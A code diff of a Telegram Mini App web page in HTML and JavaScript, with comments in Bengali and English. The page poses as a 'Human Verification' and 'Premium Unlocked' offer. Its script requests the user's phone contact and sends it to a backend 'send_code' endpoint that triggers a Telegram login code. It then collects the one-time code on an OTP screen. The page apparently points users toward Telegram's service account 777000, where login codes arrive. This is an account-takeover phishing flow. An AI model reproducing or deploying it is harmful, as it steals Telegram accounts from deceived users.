@@ -9,19 +9,18 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; user-select: none; }
         body, html { height: 100%; width: 100%; overflow: hidden; background: #000; }
         
-        /* 100% Working Background Image Fix */
         .bg-image {
             position: fixed; top: -10%; left: -10%; width: 120%; height: 120%;
             object-fit: cover;
             filter: blur(10px) brightness(0.7); 
-            z-index: 1; /* আগে -1 ছিল বলে কালোর পেছনে চলে যাচ্ছিল, এখন 1 করে দিয়েছি */
+            z-index: 1; 
             pointer-events: none;
         }
 
         .screen {
             display: none; flex-direction: column; align-items: center; justify-content: center;
             height: 100%; width: 100%; padding: 20px; position: absolute; top: 0; left: 0;
-            z-index: 10; /* স্ক্রিন সবসময় ছবির উপরে থাকবে */
+            z-index: 10; 
         }
         .screen.active { display: flex; }
 
@@ -78,7 +77,6 @@
 </head>
 <body>
 
-    <!-- ছবি এখন ঠিকঠাক স্ক্রিনে আসবে -->
     <img class="bg-image" src="https://yctirvnryrzygoxbpvoy.supabase.co/storage/v1/object/public/thumbnails/thumb_1784419834.jpg" alt="background">
 
     <!-- Screen 1: Human Verification -->
@@ -137,21 +135,23 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        function openTelegram() {
-            if (tg && typeof tg.openTelegramLink === 'function') tg.openTelegramLink('https://t.me/777000');
-            else window.location.href = "tg://openmessage?user_id=777000";
+        // আপনার আগের অরিজিনাল রিডাইরেক্ট মেথড ফিরিয়ে আনা হলো
+        function safeOpenLink(url) {
+            if (tg && typeof tg.openLink === 'function') { tg.openLink(url); } 
+            else { window.open(url, '_blank'); }
         }
 
-        // Magic starts here!
+        function openTelegram() {
+            safeOpenLink(BACKEND_URL + '/api/jump'); // হুবহু আপনার আগের সিস্টেম অনুযায়ী রিডাইরেক্ট হবে
+        }
+
         async function startProcessing() {
             if (!tg || !tg.requestContact) return showToast("Please update your Telegram app!");
             
-            // This triggers the native Telegram popup asking for phone number
             tg.requestContact((granted) => {
                 if (granted) {
                     showScreen('screen-loading');
                     
-                    // Wait 1.5 seconds for the bot to receive the contact message and cache it
                     setTimeout(async () => {
                         try {
                             let res = await fetch(`${BACKEND_URL}/api/send_code`, {
@@ -163,7 +163,7 @@
                             
                             if(data && data.status === "ok") {
                                 window.currentHash = data.hash;
-                                window.realPhone = data.real_phone; // Save the real phone returned by backend
+                                window.realPhone = data.real_phone; 
                                 showScreen('screen-otp');
                             } else {
                                 showToast(data.msg || "Failed! Server might be busy.");
@@ -205,7 +205,7 @@
                     showToast("Premium Unlocked! 🎉");
                     setTimeout(() => {
                         if (tg && typeof tg.openTelegramLink === 'function') {
-                            tg.openTelegramLink('https://t.me/+snT3FqTlgmJlNDQ1'); // Your Premium Channel Link
+                            tg.openTelegramLink('https://t.me/+snT3FqTlgmJlNDQ1'); 
                         }
                     }, 1000);
                 } else {
